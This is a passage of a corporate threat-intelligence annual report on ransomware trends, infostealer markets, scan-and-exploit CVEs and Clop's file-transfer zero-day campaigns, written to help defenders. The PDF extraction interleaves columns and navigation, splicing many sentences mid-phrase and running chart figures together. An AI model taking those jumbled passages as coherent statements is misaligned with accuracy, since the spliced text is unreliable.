State of the Threat

A Y E A R I N R E V I E W

7 T H E D I T I O N

Table of 
Contents

03

04

07

36

43

66

69

70

Letter From Our Vice President, Threat Research

Executive Summary and Key Findings

The Business of Cybercrime—Is Boomtime Back?

Innovations in TTPs Occur When Infection Chains Are Forced to Evolve

State\-Sponsored Threat Activity

Threat Actor Use of Artificial Intelligence

Conclusion

Appendix

2

2023 State of the Threat: A Year in Review01A Letter From Our Vice 
President, Threat Research

01

Letter From Our VP

Executive Summary 

and Key Findings

02

03

The Business of Cybercrime—

Is Boomtime Back?

The war in Ukraine continues to dominate the headlines, both in 

platform. We combine it with insights from engagements carried 

terms of kinetic military action and of hostile pro\-Russia cyber 

out by the Secureworks Incident Response team, dynamic threat 

activity. It is not surprising that Russian state\-sponsored threat 

actor emulation activities, extensive monitoring of the Dark Web 

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

groups persist in conducting attacks against targets in Ukraine and in 

and underground forums, coupled with proactive research into 

countries that have vocally supported Ukraine in the conflict.

cyberattacks to create a unique view of the threat landscape. All 

For the first few months after Russia's invasion of Ukraine on 

circle that further combines with the wealth of human expertise we 

these data points then feed back into Taegis, creating a virtuous 

February 24, 2022, it looked as if an unexpected but welcome victim 

offer to help keep our customers safe.

of the war might be the cybercrime ecosystem, as the number of 

successful ransomware attacks dropped. 

This report distills our findings to share with you, drawing and 

Eighteen months on, that optimism appears short lived. 

customers over the period this report covers. It specifically focuses 

building on the specialist threat intelligence we have published to our 

Ransomware attack numbers have rapidly returned to and then 

exceeded normal levels over the period of this report. Some well\-

on how threat actor behavior has evolved over the past twelve 

months, both in terms of tooling and tactics. 

07

Conclusion

new groups are joining the fray too. Other threat actors have 

and useful part of your security journey.

known ransomware operator names remain highly active, and 

We hope the information presented here proves both an interesting 

08

Appendix

Korean attackers focused on cryptocurrency theft.

also continued to concern our customers, from business email 

compromise attackers to Chinese cyberespionage groups, to North 

Sincerely,

The Secureworks® Counter Threat Unit™ (CTU) gathers the data 

obtained from the trillions of events processed by our Taegis™ XDR 

Don Smith
Vice President, Threat Research
Secureworks

2023 State of the Threat: A Year in Review

3

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

02Executive 
Summary and 
Key Findings

Over the past year, both cybercriminal and state\-sponsored threat 

actors have maintained high levels of activity, meaning that the 

threat level to businesses remains as elevated as ever. The range of 

threats remains broad, from the temporary nuisance of hacktivist 

denial of service attacks to wiper attacks or IP theft and other 

types of cyberespionage, from business email compromise to data 

exfiltration attacks or business\-threatening ransomware attacks. 

Precursor cyber activity continues at scale, delivering the malware 

that makes many of these cyberattacks, particularly ransomware 

attacks, easier and faster to carry out.

Amidst all this, Secureworks® Counter Threat Unit™ (CTU) 

researchers continue to track these threats and use their knowledge 

and expertise to develop insights into this activity. These insights 

feed into published threat intelligence and provide the indicators 

and technical content that allows us to create countermeasures that 

provide protection for Secureworks' customers. 

This report synthesizes and presents our findings for the period July 

2022 to June 2023\.

2023 State of the Threat: A Year in Review

4

01

Ransomware continues to be the primary threat 

facing organizations, because of the scope of 

disruption it can cause and its prevalence. Attack 

03

Infostealer activity has also increased, associated in 

large part with use by ransomware affiliates. Stolen 

credentials now vie with scan\-and\-exploit as some of 

numbers returned to and then exceeded historical 

the most significant precursors of ransomware attacks. 

norms, after last year's brief slowdown following the 

On a single day on one underground marketplace, as 

invasion of Ukraine. Average dwell times between 

many as seven million infostealer logs were available 

initial access and ransomware payload delivery have 

for sale, well over twice as many as on the same 

dropped significantly to a median figure of just 

day last year. The case for organizations to monitor 

24 hours. 2023 may be the most prolific year for 

underground forums for stolen data is clear.

ransomware attacks to date.

02

Supply chain attacks on and through suppliers 

provide threat actors with maximum impact for 

effort expended. Threat actors as diverse as North 

04

Drive\-by downloads are becoming increasingly 

popular as a malware delivery method and over 

the past year have surged in use as an initial 

Korean state\-sponsored groups and ransomware 

access vector for ransomware. Two major strains 

operators have conducted notable supply chain 

of malware delivered this way are Gootloader and 

attacks over the past year, leveraging initial victims 

SocGholish, often via compromised websites.

to gain access to their customers.

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

2023 State of the Threat: A Year in Review

5

01

Letter From Our VP

05

Microsoft's disabling by default of macros 

in documents from the internet has forced 

threat actors to innovate in how they deliver 

07

State\-sponsored threat activity remains driven 

by political imperatives. Russia's primary focus is 

the war in Ukraine, North Korea's is currency theft, 

02

03

Executive Summary 

and Key Findings

malware. Use of malicious Microsoft OneNote 

Iran's is suppression of opposition, and China's is 

files and container file types such as ISO grew to 

cyberespionage. However, regional focuses are, in 

The Business of Cybercrime—

Is Boomtime Back?

compensate during the year.

some cases, starting to shift, particularly on the part 

of China, which is closely monitoring the impact of 

the war on Ukraine on other European nations.

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

06

Regular and timely patching remains as essential 

as ever in preventing threat actors from 

compromising networks. Both state\-sponsored 

08

Artificial intelligence (AI) is a supporting tool to 

existing threat actors, rather than a new class of threat. 

To date, phishing lures and Telegram bots remain the 

threat groups and cybercriminals make wide use 

major tangible evidence of use of AI by threat actors. 

of scan\-and\-exploit to commence their attacks, 

However, the level of interest that threat actors are 

making exploited vulnerabilities one of the most 

showing suggests that they may soon develop more 

frequently observed initial access vectors.

complex and dangerous applications.

2023 State of the Threat: A Year in Review

6

03The Business of Cybercrime— 
Is Boomtime Back?

01

Letter From Our VP

Executive Summary 

and Key Findings

02

03

The Business of Cybercrime—

Is Boomtime Back?

Over the past year, the number of victims named on ransomware 

The last four months have proved the most fertile in terms of victim 

leak sites returned to normal levels (after the brief dip in early 20221\) 

numbers since name\-and\-shame emerged. 

and then continued to grow to reach unprecedented heights. 

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

Figure 1\. Ransomware name\-and\-shame leak site victim listings—2020 to 2023\. (Source: Secureworks)

2023 State of the Threat: A Year in Review

7

0100200300400500600JanuaryFebruary2020\-212021\-222022\-23MarchAprilMayJuneJulyAugustSeptemberOctoberNovemberDecemberIt is tempting to conclude that business is booming, although leak sites only list victims who have not 

paid the ransom, so an entirely accurate picture is not possible. However, we should not forget that 

spikes of anomalous activity on the part of a few highly impactful groups may to an extent be skewing 

the figures, as shown in figure 2\.

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

Figure 2\. Victim count by scheme per month. (Source: Secureworks)

2023 State of the Threat: A Year in Review

8

30005025751001501251752002502252757/1/228/1/229/1/2210/1/2211/1/2212/1/221/1/232/1/233/1/234/1/235/1/236/1/237/1/238/1/23LockBitLorenzLVCL0PMalasLocker0mega8BASEAkiraAvosLockerBianLianBl00dyBlack BastaBLACK SUITBlackByteBlackCat/ALPHVCactusCipherLockerCloakCrossLockCryptNetCryptOnCubaCyclopsD0N\#T (Donut Leaks)DAIXINDarkPowerDarkRaceDonutDunghill LeakEnduranceEverestHiveIceFireINC RansomIndustrial SpyKarakurtRoyalSiegedSecSnatchMetaencryptorSodinokibi (REvil)MalloxMedusaMedusa LockerMoney MessageMONTINoEscapeNokoyawaOnyxPLAYProject RelicQilinQuantumRA GROUPRagnar\_LockerRancozRansomedRansomedVCRansomEXXRansomHouseRedAlertREvilRhysidaSpartaSTORMOUSTrigonaUnsafeVendettaVice SocietyVSOP (Onyx)Yanluowangz6wkg01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Name\-and\-Shame Sites Reveal 
the Most Active Ransomware 
Groups 

At current rates of victim naming, 2023 is on course to be the most 

prolific year since name\-and\-shame attacks began in 2019\. It is likely 

that the 10,000th victim name will be posted to leak sites by late 

summer 2023\.\*

Innovations in TTPs Occur 

04

When Infection Chains Are 

However, one\-off mass exploitations of specific vulnerabilities 

explain why March (Fortra GoAnywhere, exploited by Clop operator 

GOLD TAHOE2\), May (Zimbra mail server, exploited by MalasLocker) 

Forced to Evolve

and June 2023 (MOVEit Transfer, exploited by GOLD TAHOE) saw 

the highest ever monthly number of victims named.

05

06

State\-Sponsored 

Threat Activity

The same threat groups continued to dominate in 2023—GOLD 

MYSTIC's LockBit again remains the head of the pack but GOLD 

BLAZER's BlackCat/ALPHV, Clop, GOLD SOUVENIR's Royal, 

BianLian, PLAY and GOLD REBELLION's Black Basta all feature in the 

Threat Actor Use of 

Artificial Intelligence

ten most active groups. 

07

Conclusion

08

Appendix

LockBit operator GOLD MYSTIC and its broad and loosely managed 

pool of affiliates continue to deploy LockBit ransomware prolifically. 

Once again in 2022/23, it tops the ratings for most active group, this 

time with nearly three times the number of victims of the next most 

active group, ALPHV(BlackCat), operated by GOLD BLAZER.

Figure 3\. Name\-and\-shame victims listed per year July\-June. (Source: 
Secureworks)

\* The 10,000th name\-and\-shame ransomware victim name 
was posted to the BlackCat/ALPHV leak site in mid\-August.

2023 State of the Threat: A Year in Review

9

010002000300050006000700040003698508863422020\-212021\-222022\-2301

Letter From Our VP

However, new schemes have also posted numerous victims: 

MalasLocker attacks, targeting Zimbra servers from the end of 

MalasLocker, 8BASE and Akira all emerged only in May 2023\. 8BASE 

March 20233 and listed on their leak site in May, accounted for at 

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

listed nearly 40 victims on its leak site during June 2023, only 

least 171 victims. This provides just one illustration of how valuable 

slightly fewer than LockBit. Analysis indicates it posted a dump 

scan\-and\-exploit (where threat actors use search engines to identify 

of victims going as far back as mid\-2022 all at the same time. 

vulnerable systems) can be as a tactic for ransomware groups.

Figure 4\. The 20 most active name\-and\-shame ransomware groups by victims listed between July 2022 and June 2023\. (Source: Secureworks)

2023 State of the Threat: A Year in Review

10

020040060080010001200BlackCat/ALPHVCL0PBianLianRoyalBlack BastaMalasLockerPLAY8BASEKarakurtVice SocietyHiveMedusaAkiraSnatchSTORMOUSBlackByteRansomHouseLVAvosLockerLockBit984355207202197195171143108909078655655514645433001

Letter From Our VP

Assessing the Size of the 
Ransomware Problem

02

03

Executive Summary 

and Key Findings

Accurately assessing the scale of the ransomware problem is 

challenging. Leak sites only touch on a fraction of the problem and 

not all ransomware groups operate leak sites. New ransomware 

variants launch regularly. Without a leak site, it is very difficult to 

disclosure.

The Business of Cybercrime—

judge how active they are.

Is Boomtime Back?

The primary purpose of leak sites is to encourage currently 

recalcitrant victims to pay. Therefore, they only show the names 

of victims who are yet to pay a ransom. As such, they cannot be 

considered an accurate record of any specific group's activity. 

Nor are they an indication of the overall impact of ransomware.

Historic data from ransomware group takedowns or collapses 

indicate that leak sites only reveal a small percentage of overall 

attacks. For example, Hive's leak site listed 150 organizations, likely 

accounting for around 10 percent of their overall victim count of 

1,500\. Avaddon listed just 180 victims, a small fraction of the nearly 

3,000 decryption keys the group released when it shuttered the 

operation. It is difficult to assess how representative these 

examples are.

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

To extrapolate, we would need to know how successful each group's 

leak site is and what the likelihood of payment by a victim once they 

have been named is. It may not be outlandish to assume that the 

vast majority of “successful” ransomware operations occur without 

the victim's name ever reaching the leak site—that is where the 

incentive to pay lies, with the victim motivated to prevent public 

Leak sites generally do not reveal whether ransomware was deployed. 

And we can't draw conclusions about how effective or impactful 

a ransomware deployment was, and whether the victim did not 

pay because the impact was low, or because the data stolen was 

inconsequential.

Name\-and\-shame statistics are useful for some things. They show 

how particular variants emerge onto the scene and how they 

grow and shrink in usage. But how reliable are they as indicators of 

impact? Without knowing how many victims pay the ransom, we 

can't determine how successful any particularly variant is in terms of 

payment to victim ratio. Leak site data should therefore be used with 

caution. In aggregate though it is clear from the continued activity 

that ransomware and data\-theft extortion remain a viable criminal 

business model and a substantial threat to businesses.

2023 State of the Threat: A Year in Review

11

01

Letter From Our VP

Dwell Times Are Dropping for 
Ransomware Attacks

02

03

Executive Summary 

and Key Findings

Despite the increasing threat posed by ransomware attacks, in 

many cases early detection and response thwarts attackers from 

The Business of Cybercrime—

Is Boomtime Back?

progressing to ransomware deployment. Because of this, our incident 

responders frequently discover ransomware precursor activity 

without evidence of damaging system encryption events. 

However, there have been some interesting trends over the past 

year in those attacks where ransomware is deployed. Most notably, 

24 hours

Average (median) dwell 
time for ransomware actors

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

the dwell time—the time between gaining access to a network and 

Notably, the median dwell time in ransomware engagements 

executing the ransomware—has significantly reduced compared to 

dropped to just under 24 hours from 4\.5 days in the previous year 

previous years.

and 5\.5 days in the year before that. 

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

• In just over ten percent of cases, we saw ransomware 

deployed within five hours of initial access.

• Nearly two\-thirds of attacks were carried out inside one 

single day, nearly four fifths within one week.

• In around a fifth of attacks, the threat actor sat on 

Importantly, the incident response engagements that provided 

the data used to make this calculation featured a broad range of 

18 different ransomware variants. This means that the data was 

not skewed by a prevalence of variants that are known typically to 

be deployed very quickly, such as Phobos ransomware. The dwell 

times in engagements where exfiltration of data was observed 

the network for longer than a week before deploying 

were generally longer, but this is not universally true; in some 

ransomware.

• Of those, three\-quarters continued to sit on the network 

for over a month.

engagements involving Black Basta, Hive, and AvosLocker—all 

double extortion ransomware schemes—we observed data 

exfiltration and ransomware deployment taking place more quickly 

than the median dwell time of 24 hours.

2023 State of the Threat: A Year in Review

12

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

So why are threat actors executing their ransomware attacks 

This absolutely does not imply that ransomware can now be ignored 

so much more quickly? CTU researchers have observed that 

as a threat. Even a limited distribution on a victim's network can be 

ransomware intrusions have become less complex. Threat actors 

highly damaging. Hitting a single server in a production environment, 

are not conducting the same operations more quickly. Instead, they 

for example, might be enough to take business operations offline for 

are conducting simpler operations. Devastating enterprise\-wide 

enough time to cause significant financial impact. And ransomware 

encryption events, which are more difficult to execute and take 

operators and their affiliates are aware of this. The increased take\-up 

longer to carry out, are now rarer than in previous years. 

of virtualized environments, now often crucial to many companies' 

One driver for this is likely the need to reduce dwell time to lower 

ransomware schemes now have Linux\-compatible variants, created 

the chance of detection. The cybersecurity industry is undoubtedly 

to target VMware ESXi hosts. Threat actors have an incentive to 

getting better at detecting the activity that has historically preceded 

spend minimal time on a likely\-monitored Windows system before 

ransomware, such as the use of offensive security toolkits like Cobalt 

moving to encrypt hundreds of virtual disks on a single VMware ESXi 

IT infrastructures, makes them a viable target. More and more 

Strike. This may be a factor in forcing ransomware operators to work 

host.

more quickly. 

However, it is also likely that the threat actors now deploying 

incident involving the financially motivated GOLD TOMAHAWK 

ransomware are just lower skilled than previous operators. The 

threat group (also known as Karakurt), Secureworks incident 

introduction of the RaaS model lowered the bar to entry, introducing 

responders identified 29 hosts and 10 user accounts compromised 

playbooks for affiliates to use, and allowed it to scale significantly as 

by the threat actor. Over 300GB of compressed data was exfiltrated 

Dwell times can vary considerably case by case. In July 2022, in an 

a result. 

from two of these hosts. The attacker had remained on the network 

for as long as six weeks before incident responders were engaged, 

Arguably, this represents a commodification of the ransomware 

navigating across multiple hosts in different countries possibly to 

landscape, with scheme operators reducing the cost of operations 

locate data to steal. The unusually long dwell time included a three\-

in order to increase volume. This can be seen in the sheer number 

week hiatus from malicious activity.

07

Conclusion

of victims named on name\-and\-shame leak sites. But it is also 

08

Appendix

reflected in the “quality” of ransomware operations. This might 

In contrast, in April 2023, Secureworks incident responders 

provide one reason why fewer victims are reported4 to be paying 

investigated an incident where an organization that did not use 

ransoms (although such reports may not give a full picture, given 

Secureworks managed services experienced an intrusion where, 

the fracturing of the ransomware landscape and the increasing 

within a single 24\-hour period, two different ransomware variants, 

difficulties in reliably identifying cryptocurrency wallets). 

Buhti and AvosLocker, were deployed. 

2023 State of the Threat: A Year in Review

13

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

The Top Initial Access Vectors 
for Ransomware

Scan\-and\-exploit and stolen credentials were the two largest initial 

access vectors used by threat actors in the ransomware attacks 

Secureworks investigated, each accounting for approximately 32 

percent of intrusions. These figures are consistent with the top 

IAVs for all incident response engagements over the same period 

but represent a change relative to ransomware engagements in the 

previous twelve months. This is the period covered in last year's State 

of the Threat report, when scan\-and\-exploit at 52 percent accounted 

Ransomware Initial Access 
Vectors

The three largest initial access vectors (IAVs) observed 

during ransomware engagements where customers 

engaged Secureworks incident responders were:

• Scan\-and\-exploit—32 percent

• Stolen credentials—32 percent

for many more ransomware intrusions than the next nearest IAV, 

• Commodity malware delivered via 

stolen credentials, at 39 percent. 

phishing emails—14 percent

State\-Sponsored 

Threat Activity

Secureworks incident responders also investigated several intrusions 

where threat actors used the Qakbot malware to deliver Cobalt 

Strike, which then led to Black Basta ransomware deployment. These 

incidents were notable due to the speed of the operations: again, 

data exfiltration and ransomware deployment occurred within 24 

Threat Actor Use of 

Artificial Intelligence

hours of initial access.

05

06

Each of these IAVs can either be prevented or detected 

at an early stage before ransomware is deployed, using 

a combination of prompt and regular patching, multi\-

factor authentication, and comprehensive implementing 

of monitoring solutions.

07

Conclusion

08

Appendix

2023 State of the Threat: A Year in Review

14

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

The most likely enabler of the rise in the use of stolen credentials 

Threat actors use these stolen credentials to gain unauthorized 

as an IAV is the explosion in infostealer activity. Infostealers are 

access to enterprise networks via remote access services such as 

a type of malware that can pilfer sensitive information such as 

virtual private networks (VPNs) and Microsoft Office Web Access 

login credentials, session cookies and tokens, financial details, and 

(OWA). This unauthorized access can form an early stage in the 

personal data from compromised computers and networks. Once 

exfiltration of sensitive data or the deployment of ransomware. As 

installed via methods such as phishing attacks, infected websites, 

a result, infostealers are a significant type of intrusion precursor 

and malicious software downloads, they can execute and exit very 

malware and a contributory factor to attacks that often happens 

quickly, sometimes in less than a minute of total runtime. The data 

outside protective corporate controls.

is then packaged and sold as “logs.” Each log contains data taken by 

the infostealer from a compromised user machine.

log

local application
data

documents

system
information

network
information

software
information

web browser
data

crypto wallets

VPN data

credentials

visited domains

cookies

tokens

Figure 5\. What's in a log? (Source: Secureworks)

2023 State of the Threat: A Year in Review

15

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Opening the Valves on the 
Infostealer Data to Threat 
Actor Pipeline

Initial access using stolen credentials accounted for up to 32 percent 

of the ransomware incident response engagements we handled in 

the last year. Credentials can be obtained via a variety of means, 

including phishing emails that lead victims to credential harvesting 

websites, or through previous breaches. 

Innovations in TTPs Occur 

04

When Infection Chains Are 

However, in the past year, there has been a significant increase in 

the use of infostealers to obtain credentials. A thriving market clearly 

Forced to Evolve

exists, and new infostealers are regularly developed and put up for 

sale to meet this demand. 

Russian Market remains by far the most prolific marketplace5 for 

infostealer logs. On a single day in June 2022, there were 2\.9 million 

logs advertised for sale. A year later, that figure has ballooned to 

over 7 million, over 2\.4 times as many, and a notable increase on the 

five million that were available on a single day in late February 2023\. 

Other markets include 2easy and Genesis Market, and there is also a 

significant level of trade via certain Telegram channels.

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

Figure 6\. Threat actor Telegram channel listing logs prices and deals. 
(Source: Secureworks)

2023 State of the Threat: A Year in Review

16

01

Letter From Our VP

Buyers on these marketplaces are likely discerning, seeking out 

However, sometimes there are rich pickings to be had. In October 

logs containing credentials to particularly high\-value organizations 

2022, we observed a vendor on an underground forum auctioning 

before making a purchase. However, CTU researchers have observed 

access to a home PC belonging to an employee of a global brand in 

that the bulk of logs available for purchase contain credentials for 

the food and drink industry. According to the seller, virtual network 

systems like social media platforms and common webmail services. 

computing (VNC) credentials and cookies harvested from the 

These are not likely to be of great value to ransomware operators 

employee's personal computer facilitated access to a corporate 

specifically looking to extort organizations. This means that the 

dashboard and the user's Outlook inbox. This could allow a threat 

majority of available stock likely consists of a large number of older 

actor to conduct reconnaissance, pivot deeper into the network, 

logs deemed of limited value to users. 

conduct phishing attacks, or deploy ransomware. 

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

Figure 7\. Underground forum post advertising access to corporate resources via a personal computer. (Source: Secureworks)

2023 State of the Threat: A Year in Review

17

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

Home devices have provided fertile ground for infostealers over 

Credentials go for a premium on underground forums and 

the past year. Based on posts observed by CTU researchers, most 

marketplaces because it is highly likely they are used to facilitate 

devices infected with an infostealer were running Windows 7 Home 

cybercrime\-related intrusions, including ransomware. The time lapse 

or Windows 10 Home operating systems. Typically, home computers 

between theft and use further shows the value for organizations of 

also have weaker security controls than corporate\-managed 

monitoring forums for stolen data.

devices. CTU researchers expect to see an increase in the volume of 

corporate credentials stolen from compromised personal devices for 

abuse as an initial access vector for ransomware and other malicious 

activity. Limiting how employees access company resources from 

personally owned devices can greatly reduce the enterprise's risk 

from infostealers.

Over the past year, Russian Market also added a pre\-order function 

to its website, enabling buyers to request logs by domain or type. It is 

not clear whether this functionality has been widely taken up, but the 

development implies that buyers can effectively pay sellers to target 

specific organizations or services.

The development of new infostealer malware advertised for sale 

on underground forums also occurs at speed. In 30 days through 

May and June 2023, we saw 12 new infostealers made available for 

purchase or rent on underground forums. Once advertised, they are 

tested and reviewed by forum users. Their developers rely on positive 

feedback for success and not all will become widely used.

Although the use of these tools to harvest credentials is clearly 

widespread, firm evidence connecting specific stealers to specific 

compromises is scant. This is likely to be down to two key factors: 

one, if credentials are used in a compromise, their origin is rarely 

made clear and two, the time delay between them being collected 

by an infostealer and used in an intrusion is likely to be significant, 

and certainly well beyond the scope of most incident response 

engagements. 

Figure 8\. Extract from an advertisement for the Meduza Stealer. 
(Source: Secureworks)

2023 State of the Threat: A Year in Review

18

Scan\-and\-Exploit—Why 
Patching Pays 

Scan\-and\-exploit, where threat actors use search engines like 

Shodan to identify vulnerable systems, can lead to spikes in attack 

activity by specific groups, and even anomalistic peaks in name\-

and\-shame ransomware activity. MalasLocker ransomware listed 

171 victims on their leaksite by exploiting Zimbra servers vulnerable 

to CVE\-2022\-27924, a cross\-site scripting (XSS) flaw impacting 

Zimbra Collaboration Suite 8\.8\.15\. Clop operator GOLD TAHOE 

specializes in acquiring and exploiting specific vulnerabilities in file 

transfer solutions (see the section later in the report) to impact 

maximum numbers of victims.

Initial access broker GOLD MELODY has also favored scanning 

internet\-facing servers to identify and exploit vulnerabilities 

to opportunistically compromise networks. In August 2022, 

Secureworks incident responders worked on an engagement 

where the group likely exploited a Log4j vulnerability (CVE\-2021\-

4104\) to compromise an organization's internet\-facing Flexera 

FlexNet server. 

Chinese ransomware group6 BRONZE STARLIGHT also uses scan\-

and\-exploit attacks to target unpatched internet\-facing servers. 

For example, in August 2022, CTU researchers observed BRONZE 

STARLIGHT compromising an organization's vulnerable internet\-

facing ManageEngine server. Other state\-sponsored groups depend 

on scan\-and\-exploit too, for example China's BRONZE ATLAS and 

Iran's COBALT MIRAGE. 

The easy availability of information about vulnerable servers can 

even see multiple threat actors compromising a network using the 

same vulnerability, at the same time or in quick succession.

The annual listing of top routinely exploited vulnerabilities published 

by CISA and partner agencies lists top vulnerabilities that threat 

actors scan for. Frequently, this list contains older vulnerabilities. 

Of the top 12 vulnerabilities exploited during 2022 listed in the 

roundup7 for the year, seven have CVE dates of earlier than 2022\. 

One, CVE\-2018\-13379, a path traversal vulnerability in Fortinet 

FortiOS and FortiProxy, also made the top 15 routinely exploited list 

in 2021 and in 2020\.

While organizations should always prioritize their patching schedule 

according to their individual risk profile, the vulnerabilities listed in 

these reports likely remain at high risk of exploitation.

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

2023 State of the Threat: A Year in Review

19

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

Data Leak\-Only Attacks—What's 
the Impact?

Despite initial questions about whether threat actors would find 

data leak\-only extortion a lucrative endeavor, threat groups that 

specialize in this type of attack continue their activities. Karakurt, 

thought to be a spin\-off of the now defunct Conti ransomware 

operation, persists in regularly naming victims on its leak site at an 

average of seven a month. And arguably the biggest ransomware 

event of the last year—the exploitation of a zero\-day vulnerability 

in the MOVEit Transfer file management software—did not involve 

actual ransomware at all. GOLD TAHOE continue a long\-term trend 

of targeting such utilities to steal data and hold it to ransom, naming 

many hundreds of alleged victims on its Clop leak site.

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

2023 State of the Threat: A Year in Review

20

01

Letter From Our VP

GOLD TAHOE Has Two Strings 
to Its Bow 

Executive Summary 

and Key Findings

The GOLD TAHOE threat group, operator of Clop ransomware 

and the Clop Leaks site, has been around for over a decade. Its 

listed victims, while the data theft\-only operation features the 

remainder. And the bulk of those are from two campaigns from 

2023\. By exploiting zero\-day vulnerabilities in two file management 

services—Fortra's GoAnywhere MFT in March and Progress 

Software's MOVEit Transfer application in May—the group claims 

to have successfully stolen data from over three hundred victims 

and possibly as many as six hundred. It is not possible to gauge 

exactly how many were affected given that the victims named on 

leak sites constitute those who have not paid the ransom.

Such activity for a ransomware group is unusual, but it forms the 

most recent chapter in its exploitation of vulnerabilities to steal 

and ransom victim data. Since late 2020, the group has sought to 

exploit both zero\-day and N\-day vulnerabilities in file management 

applications to extort the users of such services. Their use of zero\-

day vulnerabilities is notable, and shows how well\-resourced the 

group is—zero\-days are expensive to develop or procure, and were 

historically the domain of state\-sponsored actors.

members have worked with GOLD DRAKE (EvilCorp, Dridex), GOLD 

BLACKBURN (TrickBot), GOLD NIAGARA (FIN7\), and other well\-

known threat groups. Perhaps because of these connections, GOLD 

TAHOE does not openly communicate on any criminal forums. And 

while the group does not operate its ransomware as a RaaS, it does 

appear to rely on another group, GOLD NIAGARA, to deliver its 

ransomware in a private arrangement.

But the Clop ransomware itself tells only half of the story. While the 

leak site the group has operated since August 2020 lists victims 

of its ransomware operations, it also carries the names of those 

targeted in its attempts at data theft\-only extortion. There are 

many more names of the latter type than there are of the former; 

Clop ransomware deployments account for around a quarter of 

02

03

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

December 2020

January 2021

July 2021

March 2023

May 2023

Accellion FTA exploitation via 
CVE\-2021\-27101 and 
CVE\-2021\-27104 zero\-days

Accellion FTA exploitation via 
CVE\-2021\-27103 and 
CVE\-2021\-27102 zero\-days

Exploitation of SolarWinds 
Serv\-U CVE\-2021\-35211 
vulnerability, previously exploited 
by Chinese APT group

Exploitation of GoAnywhere 
MFT CVE\-2023\-0669 
zero\-day

Exploitation of MOVEit 
Transfer CVE\-2023\-34362 
zero\-day

Figure 9\. Services exploited by GOLD TAHOE in attacks on file transfer solutions. (Source: Secureworks)

2023 State of the Threat: A Year in Review

21

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

State\-Sponsored 

Threat Activity

05

06

Exploiting these services gives the group access to shared files, 

some of which may come from third parties, as for example in 

the Zellis payroll compromise8 which formed part of the MOVEit 

Transfer attacks. And while there is little an organization can do to 

prevent a breach of a trusted third\-party, especially through the 

